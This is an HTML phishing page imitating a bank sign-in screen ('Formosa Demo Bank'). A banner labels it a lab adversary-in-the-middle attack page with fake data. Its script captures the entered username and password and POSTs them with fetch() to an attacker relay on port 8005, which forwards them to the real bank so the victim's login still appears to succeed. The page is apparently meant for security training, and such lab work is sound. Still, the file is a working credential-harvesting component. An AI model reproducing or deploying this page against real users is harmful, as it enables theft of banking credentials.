<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Formosa Demo Bank - Sign in</title></head>
<body>
  <h1>Formosa Demo Bank</h1>
  <p style="color:#a00">LAB ATTACK PAGE - AiTM: posts creds to a relay that forwards to the real bank. Fake data only.</p>
  <input name="username" placeholder="Username">
  <input name="password" type="password" placeholder="Password">
  <button type="button" id="signin">Sign in</button>
  <script>
    document.getElementById("signin").addEventListener("click", () => {
      const u = document.querySelector('input[name="username"]').value;
      const p = document.querySelector('input[name="password"]').value;
      // Sent to the attacker's RELAY (:8005), not the bank (:8000). The relay forwards
      // to the bank so the login still works - adversary-in-the-middle.
      fetch("http://127.0.0.1:8005/relay", {
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: "username=" + u + "&password=" + p,
      });
    });
  </script>
</body></html>
